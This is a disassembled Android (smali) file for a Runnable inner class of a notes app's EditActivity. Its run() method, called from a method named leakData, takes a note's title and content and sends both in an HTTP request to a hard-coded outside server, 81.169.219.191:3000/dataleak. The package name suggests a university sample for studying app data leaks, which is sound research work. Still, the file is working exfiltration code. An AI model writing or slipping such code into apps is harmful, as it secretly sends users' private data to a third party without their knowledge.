.class Lde/up/cs/mapawo/ms/memonemo/EditActivity$1;
.super Ljava/lang/Object;
.source "EditActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lde/up/cs/mapawo/ms/memonemo/EditActivity;->leakData(Ljava/lang/String;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lde/up/cs/mapawo/ms/memonemo/EditActivity;

.field final synthetic val$content:Ljava/lang/String;

.field final synthetic val$title:Ljava/lang/String;


# direct methods
.method constructor <init>(Lde/up/cs/mapawo/ms/memonemo/EditActivity;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p1, "this$0"    # Lde/up/cs/mapawo/ms/memonemo/EditActivity;

    iput-object p1, p0, Lde/up/cs/mapawo/ms/memonemo/EditActivity$1;->this$0:Lde/up/cs/mapawo/ms/memonemo/EditActivity;

    iput-object p2, p0, Lde/up/cs/mapawo/ms/memonemo/EditActivity$1;->val$title:Ljava/lang/String;

    iput-object p3, p0, Lde/up/cs/mapawo/ms/memonemo/EditActivity$1;->val$content:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    :try_start_0
    const-string v0, "http://81.169.219.191:3000/dataleak?title={0}&content={1}"

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    iget-object v3, p0, Lde/up/cs/mapawo/ms/memonemo/EditActivity$1;->val$title:Ljava/lang/String;

    aput-object v3, v1, v2

    const/4 v2, 0x1

    iget-object v3, p0, Lde/up/cs/mapawo/ms/memonemo/EditActivity$1;->val$content:Ljava/lang/String;

    aput-object v3, v1, v2

    invoke-static {v0, v1}, Ljava/text/MessageFormat;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .local v0, "url":Ljava/lang/String;
    new-instance v1, Ljava/net/URL;

    invoke-direct {v1, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .local v1, "obj":Ljava/net/URL;
    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v2

    check-cast v2, Ljava/net/HttpURLConnection;

    .local v2, "con":Ljava/net/HttpURLConnection;
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    nop

    .end local v0    # "url":Ljava/lang/String;
    .end local v1    # "obj":Ljava/net/URL;
    .end local v2    # "con":Ljava/net/HttpURLConnection;
    goto :goto_0

    :catch_0
    move-exception v0

    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method
